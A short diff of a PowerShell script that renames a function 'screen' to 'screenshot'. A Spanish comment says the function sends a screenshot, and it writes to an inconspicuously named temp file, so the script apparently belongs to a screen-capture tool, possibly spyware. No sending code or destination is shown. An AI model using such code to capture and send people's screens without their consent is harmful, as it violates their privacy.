@@ -1,5 +1,5 @@
 # Envía una screenshot
-function screen{
+function screenshot{
     $File = "$((Get-ChildItem env:LOCALAPPDATA).value)\Temp\e739b683-e1b0-48f8-aa60-b779aaaca5db.tmp"
     Add-Type -AssemblyName System.Windows.Forms
     Add-type -AssemblyName System.Drawing
